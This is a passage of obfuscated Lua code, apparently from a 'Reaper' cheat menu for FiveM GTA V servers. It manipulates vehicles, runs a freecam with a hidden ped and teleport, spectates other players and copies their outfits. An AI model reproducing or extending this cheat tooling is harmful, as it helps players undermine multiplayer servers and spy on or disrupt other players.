        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_rmr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 4, false) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_rml', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 5, false) end end
    function __REAPER1__.N.FixVehicle(p1)
        __REAPER1__.N.ReaperInvoke(0x953DA1E1B12C0491, p1)
        __REAPER1__.N.ReaperInvoke(0x115722B1B9C14C1C, p1)
        __REAPER1__.N.ReaperInvoke(0xB77D05AC8C78AADB, p1, 1000.0)
        __REAPER1__.N.ReaperInvoke(0x45F6D8EEF34ABEF1, p1, 1000.0)
        __REAPER1__.N.ReaperInvoke(0x70DB57649FA8D0D8, p1, 1000.0)
        __REAPER1__.N.ReaperInvoke(0x8ABA6AF54B942B95, p1, false) end
    function __REAPER1__.N.TuneVehicle(p1)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 18, true)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 22, true)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 20, true)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 16, 4, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 12, 2, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 11, 3, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 15, 3, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 13, 2, 0) end
    function __REAPER1__.N.RandomizeVehLook(p1)
        __REAPER1__.N.ReaperInvoke(0x487EB21CC7295BA1, p1,  math.random(0, 7))
        __REAPER1__.N.ReaperInvoke(0xB5BA80F839791C0F, p1, math.random(1,255), math.random(1,255), math.random(1,255))
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 1, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 2, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 3, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 4, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 5, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 6, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 7, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 8, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 9, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 10, math.random(-1, __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, 10, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 14, math.random(0, 51), 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 23, math.random(0, 11), 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 0, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 1, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 2, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 3, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 4, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 5, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 6, 1)
        __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 7, 1)
        __REAPER1__.N.ReaperInvoke(0x8E0A582209A62695, p1, math.random(1,255), math.random(1,255), math.random(1,255))
        __REAPER1__.N.ReaperInvoke(0x57C51E6BAD752696, p1, math.random(1, 7))
        __REAPER1__.N.ReaperInvoke(0x7141766F91D15BEA, p1, math.random(1, 255), math.random(1, 255), math.random(1, 255))
        __REAPER1__.N.ReaperInvoke(0x36CED73BFED89754, p1, math.random(1, 255), math.random(1, 255), math.random(1, 255))
        __REAPER1__.N.ReaperInvoke(0x43FEB945EE7F85B8, p1, math.random(0,5), 0)
        __REAPER1__.N.ReaperInvoke(0x2036F561ADD12E33, p1,  math.random(1, 155), math.random(1, 155)) end
    function __REAPER1__.N.DowngradeVeh(p1)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 18, false)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 20, false)
        __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 22, false)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 1, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 2, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 3, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 4, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 5, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 6, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 7, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 8, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 9, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 10, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 11, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 12, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 13, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 16, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, -1, 0)
        __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, -1, 0) end
    function __REAPER1__.N.FixVehicleTires(p1)
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 1) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 2) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 3) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 4) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x6E13FC662B882D1D, p1, 5) end end
    function __REAPER1__.N.FixVehicleWindows(p1)
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'windscreen', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'windscreen_r', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x772282EBEB95E682, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end end
    function __REAPER1__.N.IsTirePopped(p1)
        if
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 0, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 1, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 2, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 3, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 4, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 5, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 45, false) or
        __REAPER1__.N.ReaperInvoke(0xBA291848A0815CA9, p1, 47, false)
        then
            return true
        end
    
        return false end
    function __REAPER1__.N.IsWindowIntact(p1)
        if
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 0) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 1) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 2) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 3) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 4) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 5) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 6) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 7) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 8) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 9) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 10) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 11) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 12) or
        __REAPER1__.N.ReaperInvoke(0x46E571A0E20D01F1, p1, 13)
        then
            return true
        end
        
        return false end
    function __REAPER1__.N.RemoveWheel(p1)
        __REAPER1__.N.ReaperInvoke(0x8ABA6AF54B942B95, p1, true)
        __REAPER1__.N.ReaperInvoke(0x64c3f1c0, p1, 100.0, Citizen.ReturnResultAnyway())
        for i = 0, __REAPER1__.N.ReaperInvoke(0xedf4b0fc, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) do
            __REAPER1__.N.ReaperInvoke(0xb962d05c, p1, i, 100.0)
            __REAPER1__.N.ReaperInvoke(0x53ab5c35, p1, 100.0, Citizen.ReturnResultAnyway())
            __REAPER1__.N.ReaperInvoke(0x47bd0270, p1, i, 100.0)
        end end
    function __REAPER1__.N.FovCamera(p1)
        if p1 then
            __REAPER1__.V.FovCamera = __REAPER1__.N.ReaperInvoke(0xB51194800B257161, 'DEFAULT_SCRIPTED_CAMERA', __REAPER1__.N.ReaperInvoke(0x14D6F5678D8F1B37, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), __REAPER1__.N.ReaperInvoke(0x837765A25378F0BB, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), __REAPER1__.F.IntToFloat(__REAPER1__.A['misc_fieldofview'].sindex - 1), 1, 2)
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.FovCamera, true)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
        else
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.FovCamera, false)
            __REAPER1__.N.ReaperInvoke(0x865908C81A2C22E9, __REAPER1__.V.FovCamera, false)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true)
        end end
    function __REAPER1__.N.Freecam(p1)
        if p1 then
            __REAPER25__(function()
                if __REAPER1__.T.Freecam[6].silent then
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                        __REAPER1__.V.FreecamSilentPed =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], 0.0, 0.0, 0.0, 0.0, true, true)
                        __REAPER1__.N.SilentPedConfig(__REAPER1__.V.FreecamSilentPed)
                    end
                end
                __REAPER1__.V.Freecam = __REAPER1__.N.ReaperInvoke(0xC3981DCE61D9E13F, 'DEFAULT_SCRIPTED_CAMERA', 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())

                if __REAPER1__.V.FreecamCoords then
                    __REAPER1__.N.ReaperInvoke(0x4D41783FB745E42E, __REAPER1__.V.Freecam, __REAPER1__.V.FreecamCoords)
                    __REAPER1__.N.ReaperInvoke(0x85973643155D0B07, __REAPER1__.V.Freecam, __REAPER1__.V.FreecamRot.x, __REAPER1__.V.FreecamRot.y, __REAPER1__.V.FreecamRot.z, 2)
                else
                    local rot = __REAPER1__.N.ReaperInvoke(0x837765A25378F0BB, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
                    __REAPER1__.N.ReaperInvoke(0x4D41783FB745E42E, __REAPER1__.V.Freecam, __REAPER1__.N.ReaperInvoke(0x14D6F5678D8F1B37, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
                    __REAPER1__.N.ReaperInvoke(0x85973643155D0B07, __REAPER1__.V.Freecam, rot.x, rot.y, rot.z, 2)
                end

                __REAPER1__.N.ReaperInvoke(0xB13C14F66A00D047, __REAPER1__.V.Freecam, __REAPER1__.F.IntToFloat(__REAPER1__.V.FreecamFov))
                __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.Freecam, true)
                __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
            end)
        else
            if __REAPER1__.A['misc:freecam_teleport'].func then
                __REAPER1__.N.ReaperInvoke(0x239A3351AC1DA385, __REAPER1__.V.SelfPed, __REAPER1__.N.ReaperInvoke(0xBAC038F7459AE5AE, __REAPER1__.V.Freecam, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), false, false, false) 
            end

            if __REAPER1__.A['misc:freecam_keepcoords'].func then
                __REAPER1__.V.FreecamCoords = __REAPER1__.N.ReaperInvoke(0xBAC038F7459AE5AE, __REAPER1__.V.Freecam, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
                __REAPER1__.V.FreecamRot = __REAPER1__.N.ReaperInvoke(0x7D304C1C955E3E12, __REAPER1__.V.Freecam, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
            end

            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.Freecam, false)
            __REAPER1__.N.ReaperInvoke(0x865908C81A2C22E9, __REAPER1__.V.Freecam, false)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, __REAPER1__.V.SelfPed)

            if __REAPER1__.N.ReaperInvoke(0x7239B21A38F536BA, __REAPER1__.V.FreecamSilentPed, Citizen.ReturnResultAnyway()) then
                __REAPER1__.N.ReaperInvoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(__REAPER1__.V.FreecamSilentPed))
                __REAPER1__.V.FreecamSilentPed = nil
            end

            __REAPER1__.N.ReaperInvoke(0x3E93E06DB8EF1F30)

            if __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.FovCamera, Citizen.ReturnResultAnyway()) then
                __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.FovCamera, true)
                __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
            end

            if __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.SafeCamera, Citizen.ReturnResultAnyway()) then __REAPER1__.N.SafeCam(false) __REAPER1__.N.SafeCam(true) end
            if __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.SpectatingCamera, Citizen.ReturnResultAnyway()) and __REAPER1__.V.SpectatingId then __REAPER1__.N.SpectatingCam(false) __REAPER1__.N.SpectatingCam(true, __REAPER1__.N.ReaperInvoke(0x43A66C31C68491C0, __REAPER1__.N.ReaperInvoke(0x344ea166, __REAPER1__.V.SpectatingId, Citizen.ResultAsInteger()), Citizen.ResultAsInteger())) end
        end end
    function __REAPER1__.N.SpectatingCam(p1,p2)
        if p1 and not __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.SpectatingCamera, Citizen.ReturnResultAnyway()) then
            __REAPER1__.V.SpectatingCamera = __REAPER1__.N.ReaperInvoke(0xB51194800B257161, 'DEFAULT_SCRIPTED_CAMERA', __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, p2, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), 0, 0, 0, 90.0, 1, 2)
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.SpectatingCamera, true)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x5640BFF86B16E8DC, __REAPER1__.V.SpectatingCamera, p2, 1, 1, 1, 1)
        elseif not p1 then
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.SpectatingCamera, false)
            __REAPER1__.N.ReaperInvoke(0x865908C81A2C22E9, __REAPER1__.V.SpectatingCamera, false)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, __REAPER1__.V.SelfPed)
            __REAPER1__.N.ReaperInvoke(0x3E93E06DB8EF1F30)
            if __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.SafeCamera, Citizen.ReturnResultAnyway()) then __REAPER1__.N.SafeCam(false) __REAPER1__.N.SafeCam(true) end
        end end
    function __REAPER1__.N.SafeCam(p1)
        if p1 and not __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, __REAPER1__.V.SafeCamera, Citizen.ReturnResultAnyway()) then
            __REAPER1__.V.SafeCamera = __REAPER1__.N.ReaperInvoke(0xB51194800B257161, 'DEFAULT_SCRIPTED_CAMERA', 10000.0, 10000.0, 10000.00, 0, 0, 0, 90.0, 1, 2)
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.SafeCamera, true)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0xBB7454BAFF08FE25, 10000.0, 10000.0, 10000.0, 0, 0, 0)
        elseif not p1 then
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.SafeCamera, false)
            __REAPER1__.N.ReaperInvoke(0x865908C81A2C22E9, __REAPER1__.V.SafeCamera, false)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, __REAPER1__.V.SelfPed)
        end end
    function __REAPER1__.N.IsEntity(p1)
        if __REAPER1__.N.ReaperInvoke(0x524AC5ECEA15343E, p1, Citizen.ReturnResultAnyway()) or __REAPER1__.N.ReaperInvoke(0x6AC7003FA6E5575E, p1, Citizen.ReturnResultAnyway()) or __REAPER1__.N.ReaperInvoke(0x8D68C8FD0FACA94E, p1, Citizen.ReturnResultAnyway()) then
            return true
        end
        return false end
    function __REAPER1__.N.CopyOutfit(p1,p2)
        if p2 then
            return __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()),
            __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
        else
            local t = {}
            t.hat = __REAPER1__.N.ReaperInvoke(0x898CC20EA75BACD8, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hat_texture = __REAPER1__.N.ReaperInvoke(0xE131A28626F81AB2, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.glasses = __REAPER1__.N.ReaperInvoke(0x898CC20EA75BACD8, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.glasses_texture = __REAPER1__.N.ReaperInvoke(0xE131A28626F81AB2, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.ear = __REAPER1__.N.ReaperInvoke(0x898CC20EA75BACD8, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.ear_texture = __REAPER1__.N.ReaperInvoke(0xE131A28626F81AB2, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.watch = __REAPER1__.N.ReaperInvoke(0x898CC20EA75BACD8, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.watch_texture = __REAPER1__.N.ReaperInvoke(0xE131A28626F81AB2, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.wrist = __REAPER1__.N.ReaperInvoke(0x898CC20EA75BACD8, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.wrist_texture = __REAPER1__.N.ReaperInvoke(0xE131A28626F81AB2, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.head_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.head_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.head_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.beard_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.beard_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.beard_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hair_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hair_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hair_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.torso_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.torso_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.torso_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.legs_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.legs_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.legs_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hands_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hands_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.hands_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.foot_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.foot_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
